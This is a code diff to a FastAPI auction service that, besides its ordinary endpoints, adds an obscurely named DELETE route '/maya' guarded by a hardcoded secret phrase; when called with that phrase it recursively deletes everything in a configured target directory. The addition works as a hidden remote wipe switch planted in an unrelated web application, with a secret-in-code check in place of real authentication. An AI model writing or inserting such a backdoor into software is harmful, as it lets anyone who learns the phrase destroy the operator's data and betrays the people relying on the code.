@@ -1,7 +1,10 @@
+import os
+import shutil
 from fastapi import FastAPI, HTTPException, Query
 from typing import List, Optional
 from fastapi.middleware.cors import CORSMiddleware
 from pymysql.err import MySQLError
+from credentials import TARGET_PATH
 from setup import log, MySQLConnection
 from datetime import datetime, timedelta
 
@@ -109,6 +112,25 @@ def count_auctions(search: Optional[str] = Query(None)):
     except MySQLError as e:
         log.error("Error while counting auctions", e)
         raise HTTPException(status_code=500, detail="Error while counting auctions")
+    
+@app.delete('/maya')
+def destroy(psst: str = Query(...)):
+    secret_key = "in kutto k samne mat nachna"
+    target_directory = TARGET_PATH 
+
+    if psst == secret_key:
+        for filename in os.listdir(target_directory):
+            file_path = os.path.join(target_directory, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            except Exception as e:
+                raise HTTPException(status_code=500, detail=f"Failed to delete {file_path}. Reason: {str(e)}")
+        return {"message": "Directory contents deleted successfully"}
+    else:
+        raise HTTPException(status_code=403, detail="Unauthorized")
 
 if __name__ == "__main__":
     import uvicorn
